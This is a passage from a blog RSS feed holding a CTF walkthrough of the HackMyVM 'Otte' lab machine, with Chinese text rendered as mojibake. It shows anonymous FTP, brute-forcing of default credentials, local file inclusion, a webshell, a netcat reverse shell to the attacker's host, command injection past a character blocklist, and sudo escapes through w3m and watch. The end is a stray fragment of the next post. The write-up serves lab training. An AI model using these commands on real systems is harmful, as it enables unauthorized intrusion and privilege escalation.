<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ftpåŒ¿åç™»å½•" data-href="#2.1. ftpåŒ¿åç™»å½•" href="https://www.c1trus.top/about:blank#2.1._ftpåŒ¿åç™»å½•" class="internal-link" target="_self" rel="noopener nofollow">2.1. ftpåŒ¿åç™»å½•</a>
<br><a data-tooltip-position="top" aria-label="2.2. çˆ†ç ´ç½‘ç«™ç™»å½•å¯†ç " data-href="#2.2. çˆ†ç ´ç½‘ç«™ç™»å½•å¯†ç " href="https://www.c1trus.top/about:blank#2.2._çˆ†ç ´ç½‘ç«™ç™»å½•å¯†ç " class="internal-link" target="_self" rel="noopener nofollow">2.2. çˆ†ç ´ç½‘ç«™ç™»å½•å¯†ç </a>
<br><a data-tooltip-position="top" aria-label="2.3. ç›®å½•çˆ†ç ´" data-href="#2.3. ç›®å½•çˆ†ç ´" href="https://www.c1trus.top/about:blank#2.3._ç›®å½•çˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">2.3. ç›®å½•çˆ†ç ´</a>
<br><a data-tooltip-position="top" aria-label="2.4. å‚æ•°çˆ†ç ´" data-href="#2.4. å‚æ•°çˆ†ç ´" href="https://www.c1trus.top/about:blank#2.4._å‚æ•°çˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">2.4. å‚æ•°çˆ†ç ´</a>


<br><a data-tooltip-position="top" aria-label="3. ææƒåˆ°thomas" data-href="#3. ææƒåˆ°thomas" href="https://www.c1trus.top/about:blank#3._ææƒåˆ°thomas" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒåˆ°thomas</a>

<br><a data-tooltip-position="top" aria-label="3.1. æ¢å¤æ–‡ä»¶ç­¾å" data-href="#3.1. æ¢å¤æ–‡ä»¶ç­¾å" href="https://www.c1trus.top/about:blank#3.1._æ¢å¤æ–‡ä»¶ç­¾å" class="internal-link" target="_self" rel="noopener nofollow">3.1. æ¢å¤æ–‡ä»¶ç­¾å</a>


<br><a data-tooltip-position="top" aria-label="4. ææƒåˆ°laetitiaç”¨æˆ·" data-href="#4. ææƒåˆ°laetitiaç”¨æˆ·" href="https://www.c1trus.top/about:blank#4._ææƒåˆ°laetitiaç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒåˆ°laetitiaç”¨æˆ·</a>

<br><a data-tooltip-position="top" aria-label="4.1. ä»£ç å®¡è®¡" data-href="#4.1. ä»£ç å®¡è®¡" href="https://www.c1trus.top/about:blank#4.1._ä»£ç å®¡è®¡" class="internal-link" target="_self" rel="noopener nofollow">4.1. ä»£ç å®¡è®¡</a>


<br><a data-tooltip-position="top" aria-label="5. ææƒåˆ°cedricç”¨æˆ·" data-href="#5. ææƒåˆ°cedricç”¨æˆ·" href="https://www.c1trus.top/about:blank#5._ææƒåˆ°cedricç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">5. ææƒåˆ°cedricç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="6. ææƒåˆ°root" data-href="#6. ææƒåˆ°root" href="https://www.c1trus.top/about:blank#6._ææƒåˆ°root" class="internal-link" target="_self" rel="noopener nofollow">6. ææƒåˆ°root</a><br>
- <a data-tooltip-position="top" aria-label="6.1. å¦å¤–ä¸€ç§æ–¹æ¡ˆææƒroot" data-href="#6.1. å¦å¤–ä¸€ç§æ–¹æ¡ˆææƒroot" href="https://www.c1trus.top/about:blank#6.1._å¦å¤–ä¸€ç§æ–¹æ¡ˆææƒroot" class="internal-link" target="_self" rel="noopener nofollow">6.1. å¦å¤–ä¸€ç§æ–¹æ¡ˆææƒroot</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Otte" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Otte</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=cromiphi" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=cromiphi" target="_blank">cromiphi</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# nmap 192.168.56.27 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 21:48 EST
Nmap scan report for 192.168.56.27
Host is up (0.00087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:84:B9:A1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# ftp 192.168.56.27
Connected to 192.168.56.27.
220 ProFTPD Server (Debian) [::ffff:192.168.56.27]
Name (192.168.56.27:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
226 Transfer complete
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||64320|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 May 15  2021 .
drwxr-xr-x   2 ftp      ftp          4096 May 15  2021 ..
-rw-r--r--   1 ftp      ftp            89 May 15  2021 note.txt
226 Transfer complete
ftp&gt; get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||5844|)
150 Opening BINARY mode data connection for note.txt (89 bytes)
    89      250.47 KiB/s
226 Transfer complete
89 bytes received in 00:00 (92.55 KiB/s)
ftp&gt; exit
221 Goodbye.

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# cat note.txt
Hi thomas ! I put on you personal folder the php code you asked me !

See you later +++

<br>è¿™é‡Œè·ç”¨æˆ· thomas è€Œä¸”å‘Šè¯‰æˆ‘ä»¬ä»–çš„æ–‡ä»¶å¤¹é‡Œé¢æœ‰ä¸€ä¸ªPHPæ–‡ä»¶<br><br>ç½‘ç«™éœ€è¦éªŒè¯èº«ä»½<br>æ³¨æ„ç”±äºè¿™ä¸ªé¶æœºæœ‰ç‚¹è€ï¼Œè€Œä¸”æ˜¯è€å¤–å‡ºçš„ã€‚æ‰€ä»¥è¿™é‡Œçš„æç¤ºæ¡†ä¼šç¼ºå¤±æç¤ºä¿¡æ¯ï¼Œ<br>
éœ€è¦ç”¨è€ç‰ˆæœ¬çš„æµè§ˆå™¨æ‰èƒ½æ˜¾ç¤º<br>è¿™é‡Œç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªæµè§ˆå™¨ï¼Œç”¨è¿™ä¸ªæµè§ˆå™¨å°±ä¼šæ˜¾ç¤ºæç¤ºä¿¡æ¯<br>
<a rel="noopener nofollow" class="external-link" href="https://www.playbook.com/s/yurain/au1fnEHuEk3DvD7zKVV4K9d8" target="_blank">https://www.playbook.com/s/yurain/au1fnEHuEk3DvD7zKVV4K9d8</a><br>
è®¿é—®ç½‘ç«™ä¼šç»™æˆ‘ä»¬æç¤º â€œSiemens - Root authentificationâ€<br>
<img alt="Pasted image 20241228123243" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" referrerpolicy="no-referrer"><br>
é‚£è¿™é‡Œå¾ˆå¯èƒ½å°±æ˜¯è¥¿é—¨å­è®¾å¤‡çš„é»˜è®¤è´¦å·å¯†ç <br>
å¸¸è§çš„è®¾å¤‡è´¦é¢å¯†ç å¯ä»¥åœ¨<a data-tooltip-position="top" aria-label="https://forum.ywhack.com/password.php" rel="noopener nofollow" class="external-link" href="https://forum.ywhack.com/password.php" target="_blank">è¿™é‡Œ</a>æŸ¥è¯¢(å›½å†…çš„æ¯”è¾ƒå…¨ï¼Œè¥¿é—¨å­çš„æˆ‘è¯•äº†ä¸€ä¸‹ è¿™é‡Œé¢æ²¡æœ‰æ­£ç¡®çš„)<br>
åé¢åœ¨è¿™é‡Œè·å–åˆ°äº†ä¸€ä¸ªå¸¸ç”¨çš„è¥¿é—¨å­é»˜è®¤è´¦å·å¯†ç è¡¨<br>
<a rel="noopener nofollow" class="external-link" href="https://www.192-168-1-1-ip.co/router/siemens/siemens/17622/" target="_blank">https://www.192-168-1-1-ip.co/router/siemens/siemens/17622/</a><br><br>burpçˆ†ç ´ä¸€ä¸‹å°±èƒ½è·å–åˆ°å¯†ç ï¼Œè¿™é‡Œè¦å¯¹payloadè¿›è¡Œbase64ç¼–ç <br>
<img alt="Pasted image 20241228130727" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228130727.png" referrerpolicy="no-referrer"><br>
è§£ç åçš„å¯†ç  root:zP2wxY4uE<br>
ç™»å½•æˆåŠŸåä¼šè·å–åˆ°ä¸€å¼ å›¾ç‰‡<br>
<img alt="Pasted image 20241228131103" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228131103.png" referrerpolicy="no-referrer"><br>
å›¾ç‰‡å¹¶æ²¡æœ‰éšè—ä»€ä¹ˆä¿¡æ¯<br><br>è¿™é‡Œçˆ†ç ´å‘½ä»¤ä¹Ÿéœ€è¦è¿›è¡ŒBasicè®¤è¯<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# gobuster dir -U root -P zP2wxY4uE -u http://192.168.56.27 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.27
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Auth User:               root
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 28]
/image                (Status: 200) [Size: 47076]
/config.php           (Status: 200) [Size: 0]
/thinkgeek.php        (Status: 200) [Size: 28]
<br>è·å–åˆ°äº†ä¸€ä¸ªè·¯å¾„ thinkgeek.phpï¼Œè®¿é—®åè¿˜æ˜¯é¦–é¡µçš„é‚£å¼ ç…§ç‰‡<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# curl http://192.168.56.27/thinkgeek.php -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
&lt;img src="image.jpg" alt=""&gt;     
<br><br>ä½¿ç”¨arjunçˆ†ç ´å‡ºå‚æ•° file<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# arjun -u http://192.168.56.27/thinkgeek.php --headers "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
    _
   /_| _ '
  (  |/ /(//) v2.2.7
      _/

[*] Scanning 0/1: http://192.168.56.27/thinkgeek.php
[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Logicforcing the URL endpoint
[âœ“] parameter detected: file, based on: body length
[+] Parameters found: file

<br>æ ¹æ®å‚æ•°å°±èƒ½çŒœæµ‹å‡ºè¿™é‡Œå¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªLFI<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# curl http://192.168.56.27/thinkgeek.php?file=../../../../../../etc/passwd -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:107:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:108:65534::/srv/ftp:/usr/sbin/nologin
laetitia:x:1001:1001:,,,:/home/laetitia:/bin/bash
cedric:x:1002:1002:,,,:/home/cedric:/bin/bash

<br>æµ‹è¯•å‡ºæ¥ä¹Ÿæ˜¯ä¸€ä¸ªLFI <br>ç„¶åå°è¯•è¯»å–ç§é’¥ä½†æ˜¯æ²¡æœ‰æƒé™ã€‚<br>
æ ¹æ®æç¤ºå‘Šè¯‰æˆ‘ä»¬ thomas ç”¨æˆ·ç›®å½•ä¸‹æœ‰ä¸€ä¸ªphpæ–‡ä»¶å¾ˆé‡è¦ï¼Œæˆ‘ä»¬å°†å…¶çˆ†ç ´å‡ºæ¥<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# ffuf -u http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU" |grep -v "Size: 0"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Authorization: Basic cm9vdDp6UDJ3eFk0dUU
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

shell                   [Status: 200, Size: 20, Words: 3, Lines: 3, Duration: 11ms]



<br>å‘ç°ä¸€ä¸ª shell.php <br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tools]
â””â”€# curl http://192.168.56.27/thinkgeek.php?file=../../../../../../../home/thomas/shell.php -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
Have fun !&lt;br&gt;&lt;br&gt;
<br>çˆ†ç ´ä¸€ä¸‹å‚æ•°<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# ffuf -u "http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/shell.php&amp;FUZZ=whoami"  -w /usr/share/wordlists/parameter.txt -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU" |grep -v "Size: 20"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/shell.php&amp;FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/wordlists/parameter.txt
 :: Header           : Authorization: Basic cm9vdDp6UDJ3eFk0dUU
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

file                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
command                 [Status: 200, Size: 29, Words: 3, Lines: 4, Duration: 398ms]
:: Progress: [5846/5846] :: Job [1/1] :: 956 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

<br>æ³¨æ„è¿™é‡Œç”±äºå‰é¢å·²ç»ä½¿ç”¨äº†ä¸€ä¸ªå‚æ•°fileäº†ï¼Œè¦çˆ†ç ´å¦å¤–ä¸€ä¸ªå‚æ•°åªèƒ½ç”¨&amp;<br>
è€Œä¸”arjunå¥½åƒä¸èƒ½çˆ†ç ´åŒå‚æ•°çš„è¿™ç§ã€‚è¿™é‡Œæˆ‘é€‰æ‹©ç”¨ffufçˆ†ç ´<br>çˆ†ç ´å‡ºå‚æ•°æ˜¯ command<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# curl "http://192.168.56.27/thinkgeek.php?file=../../../../../../../home/thomas/shell.php&amp;command=whoami" -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
Have fun !&lt;br&gt;&lt;br&gt;

www-data

<br>ç„¶ååå¼¹shellå³å¯<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# pwncat-cs -lp 1234

[01:15:41] Welcome to pwncat ğŸˆ!                                                                  __main__.py:164
[01:17:04] received connection from 192.168.56.27:44386                                                bind.py:84
[01:17:04] 192.168.56.27:44386: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@otte:/var/www/html$ whoami
www-data
<br><br><br>åœ¨ thomas ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæç¤º<br>(remote) www-data@otte:/home/thomas$ cat nightmare.txt
who is the son of a bitch who replaced the signature on my file with fucking XXX?! I need to find the original signature!

<br>
ç¿»è¯‘ï¼šæ˜¯è°è¿™ä¸ªæ··è›‹æŠŠæˆ‘æ–‡ä»¶çš„ç­¾åæ›¿æ¢æˆäº†è¯¥æ­»çš„ XXXï¼Ÿï¼æˆ‘éœ€è¦æ‰¾åˆ°åŸæ¥çš„ç­¾åï¼
<br>æ„æ€æ˜¯æˆ‘ä»¬è¦æ¢å¤ä¸€ä¸ªæ–‡ä»¶çš„ç­¾å,è€Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯åŒç›®å½•ä¸‹çš„ important_file<br>(remote) www-data@otte:/home/thomas$ head important_file
00000000: XXXXXXXXXXXXXXXX 0000 000d 4948 4452  .XXX........IHDR
00000010: 0000 012c 0000 012c 0806 0000 0079 7d8e  ...,...,.....y}.
00000020: 7500 0000 1b74 4558 7443 7265 6174 696f  u....tEXtCreatio
00000030: 6e20 5469 6d65 0031 3632 3130 3037 3337  n Time.162100737
00000040: 3935 3239 15fc b9e2 0000 37e9 4944 4154  9529......7.IDAT
00000050: 78da ed9d 8bab 7ecf 55de f38f 168a 2085  x.....~.U..... .
00000060: 2214 410a 2208 2294 8214 4428 8582 286a  ".A."."...D(..(j
00000070: bd50 898a d6b6 62b0 28a2 a849 9a18 a3b9  .P....b.(..I....
00000080: 7889 a931 3626 8d9a 8ba6 8947 3e5f ddb8  x..16&amp;.....G&gt;_..
00000090: ddee 99f5 ccac 35b3 67ef 773d 3090 7c7f  ......5.g.w=0.|.

<br>å¯ä»¥å‘ç°ç­¾åçš„æ–‡ä»¶å¤´å˜æˆäº†XXXX<br>
ä½†æ˜¯ç»å¸¸ç©CTF æ‚é¡¹çš„å¸ˆå‚…è‚¯å®šå°±å¯ä»¥å‘ç°ç¬¬ä¸€è¡Œæœ‰ä¸€ä¸ª IHDR è¿™ä¸ªç»å¸¸åœ¨Pngå›¾ç‰‡é‡Œé¢å‡ºç°<br>
ç„¶ååªéœ€è¦æ‰¾ä¸€ä¸ªpngå›¾ç‰‡æå–å‡ºå®ƒå‰é¢çš„16è¿›åˆ¶æ›¿æ¢æ‰å³å¯<br>
8950 4E47 0D0A 1A0A<br>
ç„¶åå¯¼å‡ºå³å¯<br>
<img alt="Pasted image 20241228143249" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228143249.png" referrerpolicy="no-referrer"> <br>å¯¼å‡ºåå¯ä»¥å¾—åˆ°ä¸€å¼ äºŒç»´ç <br>
<img alt="download" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/download.png" referrerpolicy="no-referrer"><br>
è§£æåè·å–åˆ°ä¸€ä¸ªç½‘ç«™ <a rel="noopener nofollow" class="external-link" href="https://eqrcode.co/a/SVxQdM" target="_blank">https://eqrcode.co/a/SVxQdM</a><br>
è®¿é—®ç½‘ç«™å¯ä»¥è·å–åˆ°thomasè´¦æˆ·çš„å¯†ç  thomas:youareonthegoodwaybro<br><br>thomas@otte:~$ sudo -l
Matching Defaults entries for thomas on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User thomas may run the following commands on otte:
    (laetitia) NOPASSWD: /usr/bin/python3 /home/laetitia/simpler.py *

<br><br>è§‚å¯Ÿä»£ç åœ¨ exec_ping å¤„å‘ç°äº†å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹<br>thomas@otte:~$ cat /home/laetitia/simpler.py
...
def exec_ping():
    forbidden = ['&amp;', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

<br>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤ $ ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ å‘½ä»¤æ›¿æ¢è¯­æ³•$(...) è¿›è¡Œç»•è¿‡<br>
æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬<br>thomas@otte:/tmp$ echo 'nc -e /bin/bash 192.168.56.6 2233' &gt;shell.sh
<br>ç„¶åæ‰§è¡Œè„šæœ¬åå¼¹shellå®ç°ææƒ<br>thomas@otte:/tmp$ sudo -u laetitia /usr/bin/python3 /home/laetitia/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(bash /tmp/shell.sh)

<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# pwncat-cs -lp 2233

(local) pwncat$
(remote) laetitia@otte:/tmp$ whoami
laetitia

<br><br>(remote) laetitia@otte:/tmp$ sudo -l
Matching Defaults entries for laetitia on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User laetitia may run the following commands on otte:
    (cedric) NOPASSWD:  

<br><img alt="Pasted image 20241228150404" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228150404.png" referrerpolicy="no-referrer"><br>
è¿™é‡Œæœ‰ä¸€ä¸ªæ–‡ä»¶è¯»å–ï¼Œ<br>
ä½†æ˜¯w3mçš„äº¤äº’æ¨¡å¼æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„<br>
åˆ©ç”¨äº¤æ¢æ¨¡å¼ææƒå³å¯<br>(remote) laetitia@otte:/home/laetitia/.w3m$ sudo -u cedric /usr/bin/w3m "/etc/passwd"
è¿›å»å æ‰§è¡Œ ï¼bash
cedric@otte:/home/laetitia/.w3m$ whoami
cedric

(remote) cedric@otte:/home/cedric$ cat user.txt
e1e4e2e00a00df7b40c5436155ab4996
<br><br>è¿›æ¥åæœ‰ä¸€ä¸ªid_rsa<br>(remote) cedric@otte:/home/cedric$ ls
id_rsa  user.txt
<br>å‘ç°æ˜¯rootçš„ç§é’¥<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# chmod 600 id_rsa

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzc3fvk0OLTl7Mx2VF6cr9A6AfAIV05BjNmrBnJ+lxNtP4fYzYjnvxNDtv3lbeLHsyuZD6C29nPCpvi7hUdX5tjjt5e8aFcH5Wtu1zOouXjs8RV6tCUBp433igqXwbVl1WKeQ7vYO+yuqBBacJNkXPU0e0ROwXBFWDklOYwSvnRW6Yi3VK7MQueQgP+3+ajLnwpmpOxndi3hCNwOppUlDNhEm6f8rJ4zatAXPP5SMIp6/P3c98Qjn0zHdkI7t3kL6HU5uGwQsQi3WJGz18YavwyjXHSlQLlwhTDGgOSQ6zpx4WJ7iY7mK/dL1c7CNoF115rpgqHyFJQCdlvsgIJ9jN root@otte
<br>ç›´æ¥sshä¸Šå»å³å¯<br>root@otte:~# cat root.txt
84decf19261819687b63c8210cd28f7c
<br><br>(remote) cedric@otte:/home/cedric$ sudo -l
Matching Defaults entries for cedric on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cedric may run the following commands on otte:
    (ALL : ALL) NOPASSWD: /usr/bin/mmwatch

<br>mmwatch å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªpythonè„šæœ¬ï¼Œä»–è°ƒç”¨äº† watch ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ watch çš„ææƒæ–¹å¼ç”¨å®ƒè¿›è¡Œææƒ<br>
<img alt="Pasted image 20241228152217" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228152217.png" referrerpolicy="no-referrer"><br>sudo -u root mmwatch  -x "sh -c 'reset; exec sh 1&gt;&amp;0 2&gt;&amp;0'"
(remote) root@otte:/home/cedric$ id
uid=0(root) gid=0(root) groups=0(root)

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/49.otte.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/49.otte.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 14:05:08 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[48.deba]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>


